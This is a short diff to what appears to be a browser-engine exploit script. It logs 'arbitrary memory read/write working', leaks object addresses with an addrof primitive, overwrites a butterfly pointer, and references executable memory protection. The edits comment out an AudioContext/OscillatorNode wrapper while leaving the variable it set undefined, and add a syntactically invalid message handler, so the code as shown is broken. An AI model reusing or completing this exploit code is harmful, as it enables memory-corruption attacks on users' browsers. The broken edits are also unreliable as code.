@@ -629,11 +629,11 @@ var VM_PROT_EXECUTE = 0x4
     print("[+] arbitrary memory read/write working");
         var log = print;
         //never tried this method...
-        const audioCtx = new AudioContext();
+        //const audioCtx = new AudioContext();
 
-        var oscillator = new OscillatorNode(audioCtx);
-        log('[*] Creating the OscillatorNode wrapper...');
-        var d = oscillator;
+        //var oscillator = new OscillatorNode(audioCtx);
+        log('[*] Creating the HTMLDivElement wrapper...');
+        //var d = oscillator;
         let ad_div = addrof(d);
         log('[+] Address of the div is '+ad_div.toString(16));
         //alert(FPO)
@@ -680,5 +680,10 @@ var VM_PROT_EXECUTE = 0x4
             constructor() {
               // overwrite b1's butterfly with a fastMalloc pointer
               return {fill: 1, b: b0};
+                
             }
+            this.port.onmessage = (e.data) => {
+              var d = e.data;
+              
+          }
           });
